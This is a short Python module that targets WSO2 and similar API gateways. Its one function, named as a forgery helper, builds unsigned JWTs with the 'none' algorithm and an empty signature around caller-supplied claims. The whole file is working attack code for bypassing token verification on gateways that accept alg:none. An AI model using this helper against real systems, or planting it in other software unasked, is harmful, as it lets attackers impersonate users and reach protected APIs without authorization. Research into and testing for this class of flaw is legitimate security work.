#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JWT alg:none helpers (WSO2 and similar gateways)."""

from __future__ import annotations

import base64
import json
from typing import Any, Dict


def forge_alg_none_jwt(claims: Dict[str, Any]) -> str:
    """Build an unsigned JWT with alg:none (trailing dot, empty signature)."""
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()
    ).decode().rstrip("=")
    payload = base64.urlsafe_b64encode(
        json.dumps(claims, separators=(",", ":")).encode()
    ).decode().rstrip("=")
    return f"{header}.{payload}."
